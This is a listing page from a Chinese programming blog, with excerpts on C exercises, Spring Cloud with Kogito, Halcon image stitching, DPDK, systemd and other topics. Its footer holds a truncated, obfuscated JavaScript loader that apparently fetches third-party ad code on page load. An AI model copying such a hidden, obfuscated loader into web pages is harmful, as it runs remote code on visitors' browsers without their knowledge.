		<a class="list__footer-readmore btn" href="/posts/33531497587bebc1d5659f48408172cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa27d1c13982894fa7bff6ef597e4c25/" rel="bookmark">
			上海佰斯特电子工程有限公司办公桌_公示|上海市2020年第四批拟认定高新技术企业名单...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		序号
企业名称
1
毅灿电子科技(上海)有限公司
2
上海津曼特生物科技有限公司
3
上海医米信息技术有限公司
4
上海浩显电子技术有限公司
5
上海亚湾通信设备有限公司
6
上海快数机械设备有限公司
7
上海环应网络科技有限公司
8
在孚测量技术(上海)有限公司
9
上海复培新材料科技有限公司
10
上海钜星科技有限公司
11
上海亩邻文化传媒有限公司
12
上海孛樊信息科技有限公司
13
芬安工贸(上海)有限公司
14
上海小梯匠网络科技有限公司
15
上海蓝茵环保科技有限公司
16
维几室内设计(上海)有限公司
17
上海数字电视国家工程研究中心有限公司
18
上海筑昶艺术创意有限公司
19
上海品依信息科技有限公司
20
上海领健信息技术有限公司
21
上海远足文化传播有限公司
22
上海舟汉纤维材料科技有限公司
23
上海星舆电子商务有限公司
24
上海灿态智能科技有限公司
25
上海杰擎智能科技有限公司
26
上海递拎宝网络科技有限公司
27
上海旷通科技有限公司
28
上海挚语科技有限公司
29
易材航空科技(上海)有限公司
30
上海禹舜电气有限公司
31
上海幻鱼信息科技有限公司
32
上海集博投资管理咨询有限公司
33
上海润上照明科技有限公司
34
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa27d1c13982894fa7bff6ef597e4c25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/688ff3385dcd5ff9dae49d2b0a3572b4/" rel="bookmark">
			C语言程序练习- L1-040 最佳情侣身高差 (10分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		L1-040 最佳情侣身高差 (10分) 专家通过多组情侣研究数据发现，最佳的情侣身高差遵循着一个公式：（女方的身高）×1.09 =（男方的身高）。如果符合，你俩的身高差不管是牵手、拥抱、接吻，都是最和谐的差度。
下面就请你写个程序，为任意一位用户计算他/她的情侣的最佳身高。
输入格式： 输入第一行给出正整数N（≤10），为前来查询的用户数。随后N行，每行按照“性别 身高”的格式给出前来查询的用户的性别和身高，其中“性别”为“F”表示女性、“M”表示男性；“身高”为区间 [1.0, 3.0] 之间的实数。
输出格式： 对每一个查询，在一行中为该用户计算出其情侣的最佳身高，保留小数点后2位。
输入样例： 2
M 1.75
F 1.8
输出样例： 1.61
1.96
#include&lt;stdio.h&gt; int main() { int n; double h; char sex; scanf("%d",&amp;n); getchar(); for(int i=0;i&lt;n;i++) { scanf("%c %lf",&amp;sex,&amp;h); getchar(); if(sex=='M')printf("%.2lf\n",h/1.09); else if(sex=='F')printf("%.2lf\n",h*1.09); } return 0; } 这题很简单，主要注意一下将无用字符用getchar接收一下，例如每行输出后的回车；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25d314d786b45961bf28bcb25d15a8e8/" rel="bookmark">
			003. kogito在spring cloud微服务项目上的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 引子 项目，就是新技术的实验田，在这互联网的时代，有新技术不用一下多可惜啊，所以新的项目，我就想用一用这个所谓的云原生的工作流引擎了。
2. 项目背景与目标 现在的项目是基于spring cloud搭建的微服务体系，比如这次示例需要用到的字典服务。所以今天的主要目标是：
创建一个自定义的kogito项目添加spring cloud依赖添加服务发现，通过consul找到已经注册在上面的字典服务使用feign进行RPC调用 3. 流程建模工具 JBoss出了一个桌面的流程建模工具，Business Modeler Hub Desktop-下载地址。
支持Win/Linux/MacOS有VSCode的建查插件有独立的建模工具
4. 过程 在本文起稿的前几天，kogito已经发布了1.0.0.Final版
4.1 创建项目 jboss有提供基于maven的项目模板，其实就是帮助指定的kogito的版本号，以及在pom.xml中配置好kogito的插件。
$ mvn archetype:generate \ -DarchetypeGroupId=org.kie.kogito \ -DarchetypeArtifactId=kogito-springboot-archetype \ -DgroupId=com.taotechip.floweng -DartifactId=floweng \ -DarchetypeVersion=1.0.0.Final \ -Dversion=0.1.0-SNAPSHOT # ignored log output Confirm properties configuration: groupId: com.taotechip.floweng artifactId: floweng version: 0.1.0-SNAPSHOT package: com.taotechip.floweng Y: : # 看到这个Y: :记得点一下回车，不然要等到天荒地老了。 4.2 依赖问题 添加服务注册与发现，基于consul添加open feign rpc框架解决restful标准版本依赖冲突 添加依赖
&lt;!-- 基于consul的服务注册与发现：START --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt; &lt;version&gt;2.2.5.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25d314d786b45961bf28bcb25d15a8e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65dc5a34be79d4054a5ee908bee031a9/" rel="bookmark">
			双三次插值图像旋转_halcon之图像拼接技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像拼接技术就是针对同一场景的一系列图片，根据图片的特征，比如位置，重叠部分等，拼接成一张大幅的宽视角的图像。图像拼接要求拼接后图像最大程度的与原图一致，失真尽可能的小，并且要尽量做到天衣无缝即没有明显的拼接线或其他拼接痕迹。 为达到以上目标，图像拼接要求具备以下条件：
1：图像应具有一定的特征性能，拼接正是通过这些特征来进行的。
2：图像需要具有重叠部分，一般情况下，这些重叠部分点图像的1/4以上较为合理。
3、图像的背景亮度差异不能太大，应该低于10个灰度值，否则难以拼接成功。
4、图像的方位差异不能太大，图像应该来源同一方位。
5、拼合边界过渡应平滑，以消除接拼痕迹
图像拼接前，根据图像情况，可以进行图像预处理，主要是对图像进行校正和噪声滤波
1、校正
根据图像失真原因，建立相应的校正模型，从失真的图像中提取所需要的信息。从图像失真的逆过程来恢复图像。这个过程也可以理解为设计一个滤波器，使用其能从失真图像中计算得到真实图像的估值，从而最大程度的恢复真实图像。
2、噪声滤波
噪声在图像上分布主要有两种型式：
1、位置随机，幅值基本相同，一般称之为 椒盐噪声；
2、幅值随机，但基本上每个点都存在，从幅值的分布统计来看，主要有高斯型，瑞利型，又有如频谱均匀的噪声。
对于这些噪声，处理方法有如下几种：
1、均值滤波
就是用均值替代原图像中的各个像素。具体方法是：对将处理的像素，选择一个模板，此模板为其邻近的若干像素组成，用模板中的像素的均值去替代原来的像素值 。
2、中值滤波
中值滤波是一种非线性平滑技术，它将每一像素点的灰度值设置为该点某邻域窗口内的所有像素点灰度值的中值.
中值滤波是基于排序统计理论的一种能有效抑制噪声的非线性信号处理技术，中值滤波的基本原理是把数字图像或数字序列中一点的值用该点的一个邻域中各点值的中值代替，让周围的像素值接近的真实值，从而消除孤立的噪声点。方法是用某种结构的二维滑动模板，将板内像素按照像素值的大小进行排序，生成单调上升(或下降)的为二维数据序列。二维中值滤波输出为g(x,y)=med{f(x-k,y-l),(k,l∈W)} ，其中，f(x,y)，g(x,y)分别为原始图像和处理后图像。W为二维模板，通常为3*3，5*5区域，也可以是不同的的形状，如线状，圆形，十字形，圆环形等。
图像配比：
包含以下几个要素
1、选定特征空间
特征空间是由不参与匹配的图像特征构成。特征可以为图像的灰度特征，也可以是边界，轮廓，显著特征(如角点，线交叉点，高曲率点)，统计特征(如矩不变量，中心)，高层结构描述与句法描述等；这里其实是定义了配准的空间范围。
2、相似度
评估待匹配特征之间的相似性，它通常定义为某种代价函数或者是距离函数。这里定义为需要选定的某种算法。
3、搜索空间
待估计参数组成的空间就称为搜索空间，也就是说，搜索空间是指所有可能的变换组成的空间。这其实就定义了搜索算法的空间复杂度
4、搜索策略
用合适的方法在搜索空间中找出平移，旋转等变换参数的最佳估计，使得相似度达到最大值，这其实也就是定义了搜索算法的时间复杂度。
拼接方法：
1、基于区域的配准方法
采用拼接图像的灰度值检测，对待配准图你中一块区域与参考图像中的相机尺寸的区域使用最小二乘法或者其它数学方法计算其灰度值的差异，对此差异比较后来判断待拼接图像重叠区域的相似度，由此得到待拼接图像重叠区域的范围和位置，从而实现图像拼接。也可以通过FFT变换将图像由时域变换到频域，然后再进行配准。对位移量比较大的图像，可以先校正图像的旋转，然后建立两幅图像之间的映射关系，总而言之，这种方法有很多不足，已经不是主流了。
2、基于特征的配准方法
基于特征的图像配准方法有很多形式及其改进方式，其总体特点是：不直接利用图像的像素，而是通过像素值导出图像内容最抽像的描述和符号特征，并用此特征为匹配模板，通过二维高斯模糊过滤，把几幅待配准图像的灰度局总最大值，边界边缘轮廓，边缘点，边缘线段，组织(纹理)结构，角、项点，拐点，交叉点，封闭曲线低级对应特征点及利用特征图像关系图等高级特征，构造方程组，通过数值计算得到变换数来进行图像对齐，进而确定两者的匹配位置，实现特征点，特征线等拼接，并且可以提高运算速度。
基于特征的接拼方法，分为四个步骤
1、特征检测：从图像中检测出显著且独特的图像特征，诸如：闭合区域，直线段，边缘，轮廓，点等。
2、特征匹配：从相似度确定图像之间特征的对应关系，又分为如下几类：
2.1：使用空域关系的方法
2.2：使用不变描述符的方法
2.3:松弛方法
2.4:金字塔和小波方法
3、变换模型的估计：变换函数选择和函数参数估计
4、图像变换和重采样：可以通过前向或后向的方式来实现，插值的方法有最近邻插值、双线性插值、双三次函数插值、二次样条插值、三次B样条插值、高阶B样条插值。
基于特征的方法普遍适用于局部结构信息更显著的情况，能够处理图像之间复杂变形的情况，不足之处是特征检测困难且不稳定，最关键的一点是需要有一种判断力很强的、鲁棒性能好的且对图像之间变化保持不变的特征匹配算法。
下面是Halcon自带例程，如何拼接图像
**此例程讲解了如何将几张局部的PCB图像拼接居一张大的马赛克PCB图像。**此例程使用算子proj_match_points_ransac和算子 gen_projective_masaic完成上述工作。**请注意：这个PCB图像有一几处看起来像拼接逢合线的破损点，为了更好的区分真正的缝合线，例程呈现逢合线。dev_update_off ()dev_close_window ()dev_open_window (0, 0, 640, 480, 'white', WindowHandle)dev_set_color ('green')set_display_font (WindowHandle, 14, 'mono', 'true', 'false')**一张一张的读取图像。gen_empty_obj (Images)for J := 1 to 6 by 1 read_image (Image, 'mosaic/pcb_' + J$'02') concat_obj (Images, Image, Images) dev_display (Image) disp_message (WindowHandle, 'Image ' + J$'d', 'image', -1, -1, 'black', 'true') wait_seconds (1)endfordisp_continue_message (WindowHandle, 'black', 'true')stop ()* To show the point matches that are used to compute the projective* transformation between the images, we will show all images in a large* tiled image with some space between the images so that the extents* of the images are easily visible.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65dc5a34be79d4054a5ee908bee031a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da463b8eebd9d1c9f048058a24978e8d/" rel="bookmark">
			Factorization Machines 因子分解机FM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 简介 本文是根据2010年 Steffen Rendle的《Factorization Machines》翻译总结的。Factorization Machines简称FM，因子分解机。
FM结合了因子分解的优点和支持向量机SVM的优点。
FM用因子参数构建了所有变量间的交互。这些交互通常是存在很大的稀疏性，FM的优点就是处理这些稀疏性。而且是线性的计算时间。可以直接进行优化计算的。
另外，像其他因子模型，比如matrix factorization、parallel factor analysis，以及一些特定模型，如 SVD++, PITF or FPMC。这些模型的缺点是，他们不通用，都是针对特定的输入数据，特定的任务。而FM只需要改变相应的输入数据就可以模拟这些模型，所以FM更通用，尤其是对因子模型邻域不熟悉的用户。
总之，FM的优点如下：
1)FM可以在非常稀疏的数据下进行参数估计，而SVM不能；
2)FM是线性复杂度，不依赖支持向量。FM可以支持大数据，如Netflix，有1亿个训练实例。
3)FM是一个通用的预测器，可以应用于任何真实的特征向量。而其他的因子模型对输入数据有诸多限制。而FM只需要定义输入数据的特征向量，就可以模拟这些模型。
2 稀疏性 如下图，蓝色的4列代表用户，第一列是1的话，代表用户A；第2列是1的话，代表用户B；接着是红色的5列，代表看了不同的电影，看了TI电影的，在红色第一列标1. 可以看到数据很稀疏。
3 FM 3.1 模型公式 3.2 在稀疏下的参数估计 在稀疏的情况下，通常没有足够的数据评估参数间的交互关系。FM却可以在稀疏下表现的很好，主要是其通过因子他们，打破了交互参数间的独立性。这意味着，一个交互的数据可以用来评估其他相关的交互。
举个例子：用户A和电影Star Trek（ST）之间没交互，但和Star Wars有交互。用户B、C都和电影 Star War（SW）有相似的交互；用户A和C都对电影Titanic、Star War有交互，但不同的交互向量（不同的电影等级评价）；用户B和这两个电影Star Trek（ST）、Star War（SW）都有相似的交互，，这样下来，直觉上，我们预测用户A对电影Star Trek（ST）的交互（评价），会和其与Star Wars的交互类似。
3.3 时间计算复杂度 下面公式证明FM的计算复杂度是O（kn）。
3.4 FM可以预测的类型 1)回归 2)二分类：hinge loss or logit loss. 3)排名ranking： pairwise classification loss 3.5 可以采用梯度下降学习 4 FM vs SVMs SVM的公式可以重写如下：
SVM与FM对比总体如下：
1)SVM的密集参数要求所有交互的直接关系，但这些数据在稀疏情况下经常不存在。而FM可以很好处理稀疏；
2)FM可以直接的被学习，而非线性的SVM通常是对偶式的学习。
3)FM的模型公式是独立于训练数据的，但SVM依赖部分训练数据，如支持向量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1221b0bfb58e2d56472ec49d6f7a90ab/" rel="bookmark">
			windows剪切板的历史记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		windows剪切板的历史记录 最近遇到一件比较坑的事情。当然可能也是我本人粗心大意了吧。但是这种事情难免要发生。比如说你要移动一个比较重要的东西，然后按了ctrl+x，但是之间因为别的事情耽搁了一下，而自己的重要的东西还放在剪切板里面，自己回来的时候没注意直接复制操作了其他的东西。Ctrl +z 也没有用，结果剪切板里的东西直接就没了？= =本来还想有历史记录可以挽救一下，后来发现windows默认历史记录是关闭状态的！
-_-|| 我的小心脏，，
其实按道理来说，剪切板的缓冲区默认应该是打开的，可是事实上windows默认确实关闭的。我手机上的输入法软件就默认支持剪切板的缓冲区。
为应对以上的情况，只需要将剪切板的缓冲打开就行了，这样就可以查看剪切板的历史记录了。
1.开始进入设置
2.进入系统
3.点击剪切板，打开历史记录
于是就可以通过windows + V的快捷键查看当前的剪切板历史记录了= =
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ca25c82033ebc83065661c79573ab1b/" rel="bookmark">
			Android -- SeekBar（II）纵向seekBar
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android – SeekBar（II）纵向seekBar 效果：
布局：
&lt;RelativeLayout android:layout_width="120dp" android:layout_height="120dp" android:layout_margin="@dimen/margin_10" android:padding="10dp"&gt; &lt;com.nepalese.toollibs.Activity.Component.VerticalSeekBar android:id="@+id/vSeekBar" android:padding="@dimen/padding_5" android:layout_width="match_parent" android:layout_height="match_parent" android:progressTint="@color/colorRed" android:thumbTint="@color/colorYellow"/&gt; &lt;TextView android:id="@+id/tvVSB" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textColor="@color/colorBlack" android:padding="@dimen/padding_5" android:layout_alignParentBottom="true" android:layout_alignParentEnd="true"/&gt; &lt;/RelativeLayout&gt; 使用方法：（与横向的一样）
private VerticalSeekBar verticalSeekBar; private TextView tvVSB; verticalSeekBar = findViewById(R.id.vSeekBar); tvVSB = findViewById(R.id.tvVSB); //设置最大值 verticalSeekBar.setMax(100); //设置监听 verticalSeekBar.setOnVerticalSeekBarChangeListener(new VerticalSeekBar.OnVerticalSeekBarChangeListener() { @Override public void onProgressChanged(VerticalSeekBar var1, int progress, boolean fromUser) { tvVSB.setText(""+progress); } @Override public void onStartTrackingTouch(VerticalSeekBar var1) { tvVSB.setText("StartTracking"); } @Override public void onStopTrackingTouch(VerticalSeekBar var1) { tvVSB.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ca25c82033ebc83065661c79573ab1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f42843dda76f8a976a031556b13bcc58/" rel="bookmark">
			systemd systemctl ExecStart超时处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Job for xxx.service failed because a timeout was exceeded. See "systemctl status leanote.service" and "journalctl -xe" for details. 在CentOS上编写自定义启停服务脚本时，有时脚本文件中特意设置很长的等待时间或要完成任务的时间本身就很长，例如下面的脚本：
while true do echo 'trying netcat' # do something sleep 300s done 如果在后台服务脚本中直接执行该脚本，就会收到超时信息，服务自动终止，这是我所不希望看到的：
[Unit] Description=leanote.service After=network.target mongod.service [Service] Type=forking ExecStart=/data/leanote/bin/run.sh ExecStop=/bin/kill -SIGINT $MAINPID ExecReload=/bin/kill -USR2 $MAINPID [Install] WantedBy=multi-user.target 执行“systemctl status 服务名”查看服务状态，可以看到由于systemd一直在等待run.sh脚本执行完成，但超时时间到了，自动结束了服务：leanote.service start operation timed out. Terminating.
# systemctl status leanote.service ● leanote.service Loaded: loaded (/usr/lib/systemd/system/leanote.service; enabled; vendor preset: disabled) Active: failed (Result: timeout) since 五 2020-12-04 21:32:28 CST; 2min 24s ago Process: 4279 ExecStart=/data/leanote/bin/run.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f42843dda76f8a976a031556b13bcc58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f805d1d55652c79e7fda6da98e290aa/" rel="bookmark">
			VMware 14 的安装详细教程（附上资源）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware 14 安装及CentOS7安装详细教程（附上资源） 资料自提：包括VMware14版本、CentOS6.5镜像、CentOS7镜像
链接：https://pan.baidu.com/s/1zc7xEHmQzZk8cd97uhk6vw
提取码：791e
[VMware 14 安装CentOS7超详细步骤（附资源文件）]
(https://editor.csdn.net/md/?articleId=110673868)
VMware 14安装步骤：
1.点击下一步
2.勾选“我接受…”；点击下一步
3.更改安装位置(保证含有磁盘含有40G+的空间)，我这里选择了D盘；点击下一步
4.点击下一步
5、点击安装
6、安装完成
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0aeb1bc2b95f06409b57951735f37838/" rel="bookmark">
			1176：谁考了第k名
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【题目描述】
在一次考试中，每个学生的成绩都不相同，现知道了每个学生的学号和成绩，求考第k名学生的学号和成绩。
【输入】
第一行有两个整数，分别是学生的人数n（1≤n≤100）n（1≤n≤100），和求第k名学生的k（1≤k≤n）k（1≤k≤n）。
其后有nn行数据，每行包括一个学号（整数）和一个成绩（浮点数），中间用一个空格分隔。
【输出】
输出第kk名学生的学号和成绩，中间用空格分隔。（注：请用%g%g输出成绩）
【输入样例】
5 3
90788001 67.8
90788002 90.3
90788003 61
90788004 68.4
90788005 73.9
【输出样例】
90788004 68.4
#include &lt;iostream&gt; using namespace std; int id[110]; double s[110]; int main(){ int n,k,it; double t; cin&gt;&gt;n&gt;&gt;k; for(int i=0;i&lt;n;i++) cin&gt;&gt;id[i]&gt;&gt;s[i]; for(int i=0;i&lt;n;i++){ int k=i; for(int j=i;j&lt;n;j++) if(s[j]&lt;s[k]) k=j; if(k!=i){ t=s[i]; s[i]=s[k]; s[k]=t; it=id[i]; id[i]=id[k]; id[k]=it; } } cout&lt;&lt;id[n-k]&lt;&lt;" "&lt;&lt;s[n-k]; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a0354f3a290a1d0880bfd30d15349eb/" rel="bookmark">
			DPDK实践一：技术介绍 &#43; 编译运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Intel® DPDK技术引入 网路的核心是报文的转发过程，linux网路是通过内核协议栈进行转发的，报文控制平面和数据转发平面没有分离，不适合处理大规模网络数据包，因为linux分为内核区和用户区，报文先进入内核区然后拷贝到用户区，供给上层应用程序处理。并且为了全面的支持用户空间的各个功能，协议栈中嵌入了大量用于对接的接口。如果能让应用程序直接接管网络数据包处理、内存管理以及CPU调度，那么性能可以得到一个质的提升。
如今的处理器都是多核，而且内存也越来越大，可以提高多核和大内存的扩展性，减少CPU多核之间任务的切换，内存cache miss，因为内存的访问速度永远也赶不上cache和cpu的频率，为了能让性能平行扩展，最好是少访问。
要提高网路报文转发，从如下几个方面着手：
1.控制层留给Linux做，其它数据层全部由应用程序来处理。
2.减少系统调度、系统调用、系统中断，上下文切换等
3.摒弃Linux内核协议栈，将数据包传输到用户空间定制协议栈
4.使用多核编程技术替代多线程，将OS绑在指定核上运行
5.针对SMP系统，使CPU尽量使用所在NUMA系统节点的内存，减少内存刷写
6.使用大页面，减少访问
7.采用无锁技术解竞争
Intel® DPDK全称Intel Data Plane Development Kit，是intel提供的数据平面开发工具集，主要应用x86通用平台，为用户空间高效的数据包处理提供库函数和驱动的支持。它不同于Linux系统以通用性设计为目的，而是专注于网络应用中数据包的高性能处理。
需要强调的是，DPDK应用程序是运行在用户空间上利用自身提供的数据平面库来收发数据包，绕过了Linux内核协议栈对数据包处理过程。Linux内核将DPDK应用程序看作是一个普通的用户态进程，包括它的编译、连接和加载方式和普通程序没有什么两样。DPDK程序启动后只能有一个主线程，然后创建一些子线程并绑定到指定CPU核心上运行。
二、DPDK架构 EAL（Environment Abstraction Layer）即环境抽象层，为应用提供了一个通用接口，隐藏了与底层库与设备打交道的相关细节。EAL实现了DPDK运行的初始化工作，基于大页表的内存分配，多核亲缘性设置，原子和锁操作，并将PCI设备地址映射到用户空间，方便应用程序访问。
Buffer Manager API通过预先从EAL上分配固定大小的多个内存对象，避免了在运行过程中动态进行内存分配和回收来提高效率，常常用作数据包buffer来使用。
Queue Manager API以高效的方式实现了无锁的FIFO环形队列，适合与一个生产者多个消费者、一个消费者多个生产者模型来避免等待，并且支持批量无锁的操作。
Flow Classification API通过Intel SSE基于多元组实现了高效的hash算法，以便快速的将数据包进行分类处理。该API一般用于路由查找过程中的最长前缀匹配中，安全产品中根据Flow五元组来标记不同用户的场景也可以使用。
PMD则实现了Intel 1GbE、10GbE和40GbE网卡下基于轮询收发包的工作模式，大大加速网卡收发包性能。
DPDK的优势：
DPDK拦截中断，不触发后续中断流程，并绕过协议栈，通过UIO技术将网卡收到的报文拷贝到应用层处理，报文不再经过内核协议栈。减少了中断，DPDK的包全部在用户控件使用内存池管理，内核控件与用户空间的内存交互不用进行拷贝，只做控制权转移，减少报文拷贝过程，提高报文的转发效率。
DPDK核心技术如下：
（1）通过UIO技术将报文拷贝到应用空间处理
（2）通过大页内存，降低cache miss ，提高命中率，进而cpu访问速度
（3）通过CPU亲和性，绑定网卡和线程到固定的core，减少cpu任务切换
（4）通过无锁队列，减少资源竞争
接下来深入学习总结一下dpdk所用到的技术，加深理解。
三、DPDK关键技术 1、hugepage： 使用大页缓存支持来提高内存访问效率。
为实现物理地址到虚拟地址的转换，Linux一般通过查找TLB来进行快速映射，如果在查找TLB没有命中，就会触发一次缺页中断，将访问内存来重新刷新TLB页表。Linux下默认页大小为4K，当用户程序占用4M的内存时，就需要1K的页表项，如果使用2M的页面，那么只需要2条页表项，这样有两个好处：
第一是使用hugepage的内存所需的页表项比较少，对于需要大量内存的进程来说节省了很多开销，像oracle之类的大型数据库优化都使用了大页面配置；
第二是TLB冲突概率降低，TLB是cpu中单独的一块高速cache，一般只能容纳100条页表项，采用hugepage可以大大降低TLB miss的开销。
DPDK目前支持了2M和1G两种方式的hugepage。通过修改默认/etc/grub.conf中hugepage配置为:
default_hugepagesz=1G hugepagesz=1G hugepages=32 isolcpus=0-22 1 然后通过
mount –t hugetlbfs nodev /mnt/huge 1 就将hugepage文件系统hugetlbfs挂在/mnt/huge目录下，然后用户进程就可以使用mmap映射hugepage目标文件来使用大页面了。测试表明应用使用大页表比使用4K的页表性能提高10%~15%
2、UIO,PMD，用户态轮询驱动，可以减小上下文切换开销，方便实现虚拟机和主机零拷贝zero copy。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a0354f3a290a1d0880bfd30d15349eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0b0a198af41e9f29525c2e55f0e8bdf/" rel="bookmark">
			matlab二元一次方程求解_方程的计算机处理913_Matlab
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机语言运用--数值计算9-方程的计算机处理91-3_Matlab
计算机：电子线路组成的计算机器。人与计算机则是通过计算机语言-符号系统说给计算机听而交流。
计算机语言有低级语言-机器语言、汇编、高级语言-C/C++/C#/VB/PASCAL/LISP/JAVA/PYTHON/……成百上千种之多。
作为一种计算机器—可以协助人类处理各种事情—数值计算问题、文字处理问题、图形图像处理问题、事务问题……。自从有了数字计算的计算机器，几乎所有的可以交给计算机的事情，都交给计算机来处理—是辅助处理—按照人们的要求—事先安排的模式进行处理。
数值计算
方程的计算机处理
这里说的方程，是以实数域为计算范围。
这里说的方程：是含有未知数的等式。
可以是a+5=8，或X+A=B，或ax2+bx+c=0，或ax+by=c与dx-ey=f，或ax＂+bx=c，或
或
，或
……、……
计算机如何处理这些问题呢？，问题的描述是什么样子的，才能充分利用计算机呢？
当然是代数形式的。便于计算机发挥特长，便于程序软件的重用性。通过用户交互，决定将什么样的具体问题交给计算机进行数值处理。
方程的计算机处理：
MATLAB语言及其平台 从最简单的起步，再逐级复杂，以便体会程序编写、方程的手工预处理及其人机交互。
可以用脚本文件—解释型、动态数据类型的计算机语言连续自动运行模式
a=input('输入第一个数 ')
b=input('输入第二个数 ')
x=b-a;
disp('输出计算结果 x=b-a= '),x
disp('输出计算结果 x=b+a= '),b+a
disp('输出计算结果 x=b*a='),b*a
disp('输出计算结果 x=b/a='),b/a
感觉咋样？什么是方程的计算机处理—算法及其描述，运行及其人机交互。
从最简单的代数方程计算机处理开始，通过计算机语言的运行了解、理解程序编写需要的格式。算法描述的计算机处理模式--将方程进行必要的改变，适合计算机语言描述，适合计算机按照数字电路的逻辑模式进行处理。
X+a=b型的方程需要进行改造，成为----X=b-a的样式；
计算机是进行数值计算的好帮手，因此需要对a，b预先赋值，再进行计算；
那么对于二元一次方程呢？也是如此。当然，最好是用求解方程的两个解的公式来进行处理—也就是，用它们作为计算机语言描述的基础。这样，便有了方程处理的前期工作，手工处理。
算法说明：
方程的一般形式：a1x+b1y=c1 ；a2x+b2y=c2 或者 粗糙的给出求解的一般形式 ；
求解的注意事项：需要判断 ① a1≠0；b1≠0;  a2≠0； b2≠0;  对计算机语言的表述形式来说：需要的变量有 a1；x；b1；y；c1 ；a2；x；b2；y；c2； 需要定义的计算语句有 变量赋值语句 数值计算语句 ； %二元一次方程组ax+by=c；dx+ey=f解的计算 a1=input('请输入x的系数，非0实数: ') b1=input('请输入y的系数，非0实数: ') c1=input('请输入常数项数: ') a2=input('请输入x的系数，非0实数: ') b2=input('请输入y的系数，非0实数: ') c2=input('请输入常数项数: ')
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0b0a198af41e9f29525c2e55f0e8bdf/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/399/">«</a>
	<span class="pagination__item pagination__item--current">400/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/401/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new 